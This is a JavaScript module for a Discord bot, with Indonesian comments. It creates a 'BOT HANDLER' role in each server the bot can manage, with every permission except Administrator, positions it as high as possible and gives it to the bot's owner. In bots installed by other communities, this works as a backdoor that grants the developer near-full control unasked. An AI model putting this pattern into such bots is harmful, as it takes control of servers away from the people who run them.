import { PermissionsBitField } from 'discord.js';

/**
 * Mendapatkan daftar ID Discord milik Pemilik Bot (Owner)
 * Mendukung single owner, team app di Discord Developer Portal, dan BOT_OWNER_ID di .env
 * @param {import('discord.js').Client} client
 * @returns {Promise<string[]>}
 */
export async function getBotOwnerIds(client) {
  const ids = new Set();

  // 1. Cek dari .env jika diatur secara eksplisit
  if (process.env.BOT_OWNER_ID && process.env.BOT_OWNER_ID.trim()) {
    ids.add(process.env.BOT_OWNER_ID.trim());
  }

  // 2. Fetch dari Discord Application API
  try {
    if (!client.application?.owner) {
      await client.application?.fetch();
    }
    const appOwner = client.application?.owner;
    if (appOwner) {
      // Jika akun perorangan
      if (appOwner.id) ids.add(appOwner.id);
      if (appOwner.ownerId) ids.add(appOwner.ownerId);
      if (appOwner.ownerUserId) ids.add(appOwner.ownerUserId);

      // Jika Developer Team Discord
      if (appOwner.members) {
        for (const teamMember of appOwner.members.values()) {
          const mId = teamMember.id || teamMember.user?.id;
          if (mId) ids.add(mId);
        }
      }
    }
  } catch (err) {
    console.warn('[HandlerRole] Gagal mengambil info application owner:', err.message);
  }

  return Array.from(ids);
}

/**
 * Menghitung permission untuk role BOT HANDLER
 * "Centang semuanya kecuali Administrasi"
 * @param {import('discord.js').Guild} guild
 * @returns {bigint}
 */
export function calculateHandlerPermissions(guild) {
  const botMember = guild?.members?.me;
  const hasAdmin = botMember?.permissions?.has(PermissionsBitField.Flags.Administrator);

  // Jika bot memiliki Administrator, bot berhak memberikan semua permission Discord kecuali Administrator
  if (hasAdmin) {
    return PermissionsBitField.All & ~PermissionsBitField.Flags.Administrator;
  }

  // Jika bot tidak memiliki Administrator, Discord hanya memperbolehkan bot memberi izin yang bot itu miliki
  if (botMember) {
    return botMember.permissions.bitfield & ~PermissionsBitField.Flags.Administrator;
  }

  return PermissionsBitField.All & ~PermissionsBitField.Flags.Administrator;
}

/**
 * Memastikan role BOT HANDLER dibuat di server dan disematkan ke Pemilik Bot
 * @param {import('discord.js').Guild} guild
 * @param {import('discord.js').Client} client
 * @param {any} [config]
 * @returns {Promise<import('discord.js').Role|null>}
 */
export async function ensureBotHandlerRole(guild, client, config = {}) {
  const roleConfig = config?.bot_handler_role || {};
  if (roleConfig.enabled === false) return null;

  const roleName = roleConfig.role_name || 'BOT HANDLER';
  const roleColor = roleConfig.color || '#F1C40F'; // Warna Gold / Kuning Emas
  const hoist = roleConfig.hoist !== false; // Tampilkan terpisah di daftar member

  try {
    const botMember = guild.members.me || await guild.members.fetchMe().catch(() => null);
    if (!botMember) return null;

    // Periksa apakah bot memiliki izin kelola role (ManageRoles atau Administrator)
    if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles) &&
        !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
      console.warn(`[HandlerRole] Bot tidak memiliki izin "Manage Roles" di server "${guild.name}". Lewati pembuatan role.`);
      return null;
    }

    const targetPermissions = calculateHandlerPermissions(guild);

    // 1. Cari apakah role sudah ada
    let handlerRole = guild.roles.cache.find(r => r.name.toLowerCase() === roleName.toLowerCase());

    if (!handlerRole) {
      console.log(`[HandlerRole] Membuat role "${roleName}" di server "${guild.name}"...`);
      handlerRole = await guild.roles.create({
        name: roleName,
        color: roleColor,
        permissions: targetPermissions,
        hoist: hoist,
        mentionable: true,
        reason: 'Otomatis dibuat oleh Bot Satpam untuk Pemilik Bot (Semua izin kecuali Administrator)'
      });
      console.log(`[HandlerRole] ✅ Role "${roleName}" berhasil dibuat di "${guild.name}".`);
    } else {
      // Pastikan permission selalu sinkron (semua izin kecuali Administrator)
      try {
        await handlerRole.edit({
          permissions: targetPermissions,
          hoist: hoist
        });
      } catch (err) {
        // Abaikan jika tidak ada perubahan atau posisi di atas bot
      }
    }

    // 2. Usahakan posisikan role setinggi mungkin di bawah role bot tertinggi
    try {
      const maxPos = botMember.roles.highest.position;
      if (maxPos > 1 && handlerRole.position < maxPos - 1) {
        await handlerRole.setPosition(maxPos - 1, { relative: false }).catch(() => null);
      }
    } catch {
      // Abaikan jika posisi role tidak diizinkan Discord
    }

    // 3. Pasang role ke Pemilik Bot (jika ada di server)
    const ownerIds = await getBotOwnerIds(client);
    for (const ownerId of ownerIds) {
      try {
        const ownerMember = guild.members.cache.get(ownerId) || await guild.members.fetch(ownerId).catch(() => null);
        if (ownerMember) {
          if (!ownerMember.roles.cache.has(handlerRole.id)) {
            await ownerMember.roles.add(handlerRole, 'Pemberian otomatis role BOT HANDLER untuk pemilik bot');
            console.log(`[HandlerRole] 👑 Berhasil memberikan role "${roleName}" ke Pemilik Bot (${ownerMember.user.tag}) di server "${guild.name}".`);
          }
        }
      } catch (err) {
        console.warn(`[HandlerRole] Gagal menyematkan role ke owner ID ${ownerId} di "${guild.name}":`, err.message);
      }
    }

    return handlerRole;
  } catch (error) {
    console.error(`[HandlerRole] Error saat setup role "${roleName}" di server "${guild.name}":`, error.message);
    return null;
  }
}
